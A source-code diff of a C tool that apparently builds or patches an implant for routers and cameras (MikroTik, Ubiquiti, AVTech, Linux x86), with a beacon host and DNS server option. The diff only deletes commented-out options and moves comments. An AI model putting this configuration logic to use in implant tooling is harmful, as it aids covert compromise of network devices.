@@ -137,10 +137,8 @@ int usage(char **argv)
 	fprintf(stdout, "                             * 'raw' - all unpatched\n");
 	fprintf(stdout, "                             * 'mt-x86'\n");
 	fprintf(stdout, "                             * 'mt-mips'\n");
-//	fprintf(stdout, "                             * 'mt-mipsel' (or 'mt-mipsle' (deprecated) )\n");
 	fprintf(stdout, "                             * 'mt-ppc'\n");
 	fprintf(stdout, "                             * 'linux-x86'\n");
-//	fprintf(stdout, "                             * 'sol-x86'\n");
 	fprintf(stdout, "                             * 'ub-mips'\n");
 	fprintf(stdout, "                             * 'avt-arm'\n");
 	fprintf(stdout, "    %s[-h ]%s              - print this usage\n\n", GREEN, RESET);
@@ -204,17 +202,12 @@ int main(int argc, char **argv)
 				return -1;
 			}
 
-			// save pointer to the unmodified user input.  this is echo'd back to user
-			host = optarg;
+			host = optarg;	// save pointer to the unmodified user input.  this is echo'd back to user
 
-			// fill/initialize structure with random data
-			RandFill(args.beacon_ip, sizeof(args.beacon_ip));
+			RandFill(args.beacon_ip, sizeof(args.beacon_ip));	// fill/initialize structure with random data
 
 			args.host_len = strlen(optarg);
-			memcpy(args.beacon_ip, optarg, strlen(optarg));
-
-			// copy string representation of hostname or IP into the structure
-			memcpy(args.beacon_ip, optarg, args.host_len);
+			memcpy(args.beacon_ip, optarg, strlen(optarg));	// copy string representation of hostname or IP into the structure
 
 			break;
 
@@ -333,19 +326,14 @@ int main(int argc, char **argv)
 				if (OPTMATCH(optarg, "mt-mips"))	{mikrotik_mips = 1;		break;}
 				if (OPTMATCH(optarg, "mt-mipsbe"))	{mikrotik_mips = 1;		break;}
 				if (OPTMATCH(optarg, "mt-x86"))		{mikrotik_x86 = 1;		break;}
-//				if (OPTMATCH(optarg, "sol-x86"))	{solaris_x86 = 1;		break;}
 				if (OPTMATCH(optarg, "linux-x86"))	{linux_x86 = 1;			break;}
-//				if (OPTMATCH(optarg, "mt-mipsel"))	{mikrotik_mipsel = 1;	break;}
-//				if (OPTMATCH(optarg, "mt-mipsle"))	{mikrotik_mipsel = 1;	break;}
 				if (OPTMATCH(optarg, "ub-mips"))	{ubiquiti_mips = 1;		break;}
 				if (OPTMATCH(optarg, "avt-mips"))	{avtech_arm = 1;		break;}
 				if (OPTMATCH(optarg, "raw"))		{raw = 1;				break;}
 
 				if (OPTMATCH(optarg, "all"))		{linux_x86 = 1,
-//													solaris_x86 = 1,
 													mikrotik_x86 = 1,
 													mikrotik_mips = 1,
-//													mikrotik_mipsel = 1,
 													mikrotik_ppc = 1,
 													ubiquiti_mips = 1;
 													avtech_arm = 1;
@@ -375,6 +363,7 @@ int main(int argc, char **argv)
 		case 'S':
 			{
 			char *address;
+
 			address = asloc(optarg);
 			if (strlen(address) > 16) {
 				fprintf(stderr, "ERROR: DNS server address too long -- must be in dotted quad format (e.g. 192.168.53.53)\n");
